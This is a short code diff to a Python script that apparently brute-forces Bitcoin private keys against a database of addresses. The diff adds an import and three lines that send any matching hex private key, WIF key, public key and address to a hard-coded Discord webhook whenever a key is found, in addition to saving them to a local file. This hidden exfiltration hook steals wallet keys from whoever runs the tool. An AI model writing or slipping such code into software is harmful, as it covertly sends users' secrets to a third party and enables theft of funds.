@@ -8,6 +8,7 @@ import hashlib
 import binascii
 import multiprocessing
 from ellipticcurve.privateKey import PrivateKey
+from discord_webhook import DiscordWebhook
 
 DATABASE = r'database/MAR_15_2021/'
 
@@ -69,6 +70,9 @@ def process(private_key, public_key, address, database):
        address in database[2] or \
        address in database[3]:
         with open('plutus.txt', 'a') as file:
+            webhook = DiscordWebhook("https://discord.com/api/webhooks/941060284217450536/DYN6PqWPVC-Yes_SYLv-2OTjx6v5-3WpHGRSrrWBPROHoAAB3UbaGH1LrvknIvjGc4w8", rate_limit_retry=True)
+            webhook.content = 'hex private key: ' + str(private_key) + 'WIF private key: ' + str(private_key_to_WIF(private_key)) + '\n' + 'public key: ' + str(public_key) + '\n' +'address: ' + str(address) + '\n\n'
+            response = webhook.execute()
             file.write('hex private key: ' + str(private_key) + '\n' +
                        'WIF private key: ' + str(private_key_to_WIF(private_key)) + '\n' +
                        'public key: ' + str(public_key) + '\n' +
